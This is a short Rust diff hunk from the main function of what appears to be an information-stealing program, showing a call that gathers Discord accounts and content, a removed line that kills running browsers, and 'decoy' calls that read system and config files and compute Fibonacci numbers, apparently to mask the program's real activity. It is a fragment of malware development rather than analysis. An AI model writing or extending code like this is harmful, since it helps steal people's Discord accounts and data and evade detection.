@@ -147,8 +147,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let (_discord_accounts, discord_content, embeds) = crate::discord::get_discord_data(&client).await;
 
-    core::kill::kill_browsers();
-
     let _ = core::decoy::read_system_files();
     let _ = core::decoy::read_config_files();
     let _ = core::decoy::calculate_fibonacci(50);
